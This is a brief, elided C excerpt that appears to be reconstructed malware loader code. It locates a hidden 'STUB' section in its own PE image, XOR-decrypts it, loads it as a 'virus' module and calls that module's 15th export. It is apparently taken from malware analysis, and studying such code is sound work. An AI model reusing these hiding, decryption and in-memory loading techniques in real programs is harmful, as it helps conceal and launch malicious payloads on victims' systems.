...
void LoadSTUBSection(void) {
  ...
  if (!LocateSTUBSection((PVOID *)&pSectionSTUB, &pSectionVirtualSize))
    return;

  DecryptSTUBSection((char *)(pSectionSTUB[0] + (UINT32)pSectionSTUB),
                     pSectionSTUB[1]); // (552, 498176)

  if (!Setup(NULL, (PVOID)(*pSectionSTUB + (UINT32)pSectionSTUB),
             pSectionSTUB[1], &hVirusModule)) // (0, 552, 498176, ...)
  {
    // Run the 15th exported function from the loaded module
    pVirusExecEntry = GetProcAddress(hVirusModule, (LPCSTR)15);
    if (pVirusExecEntry)
      ((__tLibraryExecEntry)pVirusExecEntry)((DWORD)pSectionSTUB,
                                             pSectionVirtualSize);
...
void DecryptSTUBSection(char *pSectionSTUB, UINT32 pSectionVirtualSize) {
  ...
  do {
    ...
    if (iCyclesSecondXOR) {
      do {
        pSectionSTUB[iSecondXOR] ^=
            *(&pSectionSTUB[(pSectionVirtualSize + 1) / 2] + iSecondXOR);
        ++iSecondXOR;
...
bool LocateSTUBSection(PVOID *pRawSectionSTUB, INT32 *pSectionVirtualSize) {
  ...
  pImageNT = (PIMAGE_NT_HEADERS)(
      (DWORD)g_hInstDLL +
      ((PIMAGE_DOS_HEADER)hINSTANCE)->e_lfanew); // (hINSTANCE + 240)

  if (pImageNT->Signature != PE_HEADER)
    return FALSE;

  pImageSection = (PIMAGE_SECTION_HEADER)(
      pImageNT->FileHeader.SizeOfOptionalHeader + (DWORD)pImageNT +
      sizeof(IMAGE_FILE_HEADER) + sizeof(DWORD)); // (PE header + 224 + 24)
